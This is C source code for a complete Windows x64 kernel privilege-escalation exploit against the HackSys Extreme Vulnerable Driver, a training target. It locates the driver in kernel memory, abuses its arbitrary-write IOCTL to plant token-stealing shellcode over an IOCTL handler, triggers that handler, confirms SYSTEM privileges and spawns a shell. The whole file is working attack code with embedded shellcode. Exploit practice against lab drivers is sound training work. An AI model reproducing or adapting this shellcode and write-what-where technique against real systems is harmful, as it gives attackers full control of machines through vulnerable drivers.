/* wetw0rk */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <windows.h>
#include <psapi.h>
#include <ntdef.h>
#include <winternl.h>
#include <shlwapi.h>

#define ARBITRARY_WRITE 0x22200b
#define TARGET_FUNCTION 0x22206f

/* Structure used by Write-What-Where */
typedef struct _WRITE_WHAT_WHERE
{
  uint64_t *ullpWhat;
  uint64_t *ullpWhere;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

/* GetKernelModuleBase():
     Function used to obtain kernel module address */
LPVOID GetKernelModuleBase(PCHAR pKernelModule)
{
  char pcDriver[1024]    = { 0 };
  LPVOID lpvTargetDriver = NULL;
  LPVOID *lpvDrivers     = NULL;
  DWORD dwCB             = 0;
  DWORD dwDrivers        = 0;
  DWORD i                = 0;

  EnumDeviceDrivers(NULL, dwCB, &dwCB);
  if (dwCB <= 0)
    return NULL;

  lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID));
  if (lpvDrivers == NULL)
    return NULL;

  if (EnumDeviceDrivers(lpvDrivers, dwCB, &dwCB))
  {
    dwDrivers = dwCB / sizeof(LPVOID);
    for (i = 0; i < dwDrivers; i++)
      if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver)))
        if (StrStrA(pcDriver, pKernelModule) != NULL)
          lpvTargetDriver = lpvDrivers[i];
  }

  free(lpvDrivers);

  return lpvTargetDriver;
}

/* WriteBytes():
     This function triggers the Write-What-Where vulnerability */
void WriteBytes(HANDLE hHEVD, uint64_t ullWhat, uint64_t ullWhere)
{
  DWORD dwBytesReturned = 0;
  WRITE_WHAT_WHERE www = { 0 };

  www.ullpWhere = (uint64_t *)ullWhere;
  www.ullpWhat = &ullWhat;
  printf("\t[*] Writing 0x%p to 0x%p\n", *www.ullpWhat, www.ullpWhere);

  DeviceIoControl(hHEVD,
                  ARBITRARY_WRITE,
                  &www,
                  sizeof(WRITE_WHAT_WHERE),
                  NULL,
                  0x00,
                  &dwBytesReturned,
                  NULL);

  return;
}

/* CheckWin():
     Simple function to check if we're running as SYSTEM */
int CheckWin(VOID)
{
  DWORD win = 0;
  DWORD dwLen = 0;
  CHAR *cUsername = NULL;

  GetUserNameA(NULL, &dwLen);

  if (dwLen > 0) {
    cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR));
  } else {
    printf("[-] Failed to allocate buffer for username check\n");
    return -1;
  }

  GetUserNameA(cUsername, &dwLen);

  win = strcmp(cUsername, "SYSTEM");
  free(cUsername);

  return (win == 0) ? win : -1;
}

/* Exploit():
     Arbitrary Write */
int Exploit(HANDLE hHEVD)
{
  LPVOID pHEVDBase         = NULL;
  DWORD i                  = 0;
  DWORD dwShellcodeLength  = 0;
  DWORD dwBytesReturned    = 0;
  uint64_t ullTarget       = 0;
  uint64_t ullRawBytes     = 0;

  CHAR cRawBytes[60] = { 0 };
  CHAR shellcode[]=
  /* ALIGNMENT */
  "\x90\x90"

  /* python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint (58 bytes) */
  "\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00" // movabs rax, qword ptr gs:[0x188]
  "\x48\x8b\x80\xb8\x00\x00\x00"                 // mov rax, qword ptr [rax + 0xb8]
  "\x48\x89\xc1"                                 // mov rcx, rax
  "\xb2\x04"                                     // mov dl, 4
  "\x48\x8b\x80\x48\x04\x00\x00"                 // mov rax, qword ptr [rax + 0x448]
  "\x48\x2d\x48\x04\x00\x00"                     // sub rax, 0x448
  "\x38\x90\x40\x04\x00\x00"                     // cmp byte ptr [rax + 0x440], dl
  "\x75\xeb"                                     // jne 0x1017
  "\x48\x8b\x90\xb8\x04\x00\x00"                 // mov rdx, qword ptr [rax + 0x4b8]
  "\x48\x89\x91\xb8\x04\x00\x00"                 // mov qword ptr [rcx + 0x4b8], rdx

  /* KERNEL RECOVERY */
  "\x48\x31\xc0"                         /* xor rax, rax */
  "\xc3";                                /* ret */                            

  dwShellcodeLength = 64;
  if ((dwShellcodeLength % 8) != 0)
  {
    printf("[-] Shellcode must be divisible by 8\n");
    return -1;
  }

  pHEVDBase = GetKernelModuleBase("HEVD");
  if (pHEVDBase == NULL)
  {
    printf("[-] Failed to obtain the base address of HEVD\n");
    return -1;
  }
  printf("[*] Obtained the base address of HEVD: 0x%p\n", pHEVDBase);

  ullTarget = (uint64_t)pHEVDBase + 0x85b14;
  printf("[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\n");

  /* Same operation as the Windows 7 exploit just ported to work on 64bit addressing */
  for (i = 0; i < dwShellcodeLength; i += sizeof(uint64_t))
  {
    sprintf(cRawBytes, "0x%02x%02x%02x%02x%02x%02x%02x%02x", ((uint32_t)shellcode[i+7] & 0xff),
                                                             ((uint32_t)shellcode[i+6] & 0xff),
                                                             ((uint32_t)shellcode[i+5] & 0xff),
                                                             ((uint32_t)shellcode[i+4] & 0xff),
                                                             ((uint32_t)shellcode[i+3] & 0xff),
                                                             ((uint32_t)shellcode[i+2] & 0xff),
                                                             ((uint32_t)shellcode[i+1] & 0xff),
                                                             ((uint32_t)shellcode[i+0] & 0xff));

    ullRawBytes = strtoull(cRawBytes, NULL, 16);
    WriteBytes(hHEVD, ullRawBytes, ullTarget);
    memset(cRawBytes, '\0', 60);
    ullTarget += sizeof(uint64_t);
  }

  printf("[*] Shellcode buffer written!!\n");
  printf("[*] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler\n");
  DeviceIoControl(hHEVD,
                  TARGET_FUNCTION,
                  NULL,
                  0x00,
                  NULL,
                  0x00,
                  &dwBytesReturned,
                  NULL);

  return CheckWin();
}

int main()
{
  HANDLE hHEVD = NULL;

  hHEVD = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                      (GENERIC_READ | GENERIC_WRITE),
                      0x00,
                      NULL,
                      OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL,
                      NULL);

  if (hHEVD == INVALID_HANDLE_VALUE)
  {
    printf("[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n");
    return -1;
  }

  if (Exploit(hHEVD) == 0) {
    printf("[+] Exploitation successful, enjoy the shell!!\n\n");
    system("cmd.exe");
  } else {
    printf("[*] Exploitation failed, run again\n");
  }

  if (hHEVD != NULL)
    CloseHandle(hHEVD);

  return 0;
}
